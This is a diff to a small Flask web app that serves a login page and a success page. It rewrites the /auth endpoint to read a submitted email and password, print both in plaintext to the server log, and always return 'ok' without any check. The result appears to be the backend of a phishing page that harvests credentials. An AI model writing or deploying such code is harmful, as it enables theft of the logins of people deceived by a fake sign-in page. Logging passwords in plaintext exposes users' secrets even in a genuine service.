@@ -3,50 +3,43 @@ from flask_cors import CORS
 from datetime import datetime
 import os
 
-app = Flask(__name__, static_folder=".")
+BASE_DIR = os.path.dirname(os.path.abspath(__file__))
+
+app = Flask(__name__)
 CORS(app)
 
 
 # Page principale
 @app.route("/")
 def index():
-    return send_from_directory(".", "login.html")
+    return send_from_directory(BASE_DIR, "login.html")
 
 
 @app.route("/login.html")
-def login():
-    return send_from_directory(".", "login.html")
+def login_page():
+    return send_from_directory(BASE_DIR, "login.html")
 
 
 @app.route("/success.html")
-def success():
-    return send_from_directory(".", "success.html")
+def success_page():
+    return send_from_directory(BASE_DIR, "success.html")
 
 
-# Endpoint formulaire
 @app.route("/auth", methods=["POST"])
 def auth():
+    data = request.get_json(silent=True) or {}
 
-    data = request.get_json(silent=True)
+    email = data.get("email", "")
+    password = data.get("password", "")
 
-    if not data:
-        return jsonify({"error": "no data"}), 400
-
-    name = data.get("name", "")
-    message = data.get("message", "")
-
-    line = f"{datetime.now().isoformat()} | {name} | {message}\n"
-
-    with open("log.txt", "a", encoding="utf-8") as f:
-        f.write(line)
-
-    print(line.strip(), flush=True)
+    print(
+        f"[{datetime.now().isoformat()}] email={email} password={password}",
+        flush=True
+    )
 
     return jsonify({"status": "ok"}), 200
 
 
 if __name__ == "__main__":
-    import os
-    port = int(os.environ["PORT"])
+    port = int(os.environ.get("PORT", 8080))
     app.run(host="0.0.0.0", port=port)
-
